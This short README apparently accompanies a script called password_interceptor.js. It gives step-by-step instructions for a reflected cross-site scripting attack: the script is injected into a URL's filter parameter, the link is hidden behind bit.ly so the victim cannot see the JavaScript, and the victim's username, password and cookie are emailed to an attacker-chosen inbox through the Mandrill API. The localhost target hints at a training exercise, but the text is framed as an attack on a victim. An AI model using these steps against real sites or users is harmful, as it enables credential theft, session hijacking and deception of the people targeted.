password_interceptor.js includes a script that takes the values of the username and password fields and sends them in an email to a user-defined inbox when the 'submit' button is clicked.  Here is how to use it:

1. Set up a Mandrill account and insert the API key in the appropriate location in password_interceptor.js
2. Change other details about the email recipient etc. as needed
3. Construct the following URL:

http://localhost:8080/#filter=<script><javascript contents></script><search query>

Where <javascript contents> are the contents of password_interceptor.js and <search query> is some bogus search query.

4. Shorten the URL with bit.ly so the victim cannot see the javascript.
5. Open the link and use the site as usual.  When you login, you should receive an email with the user's username, password, and cookie.
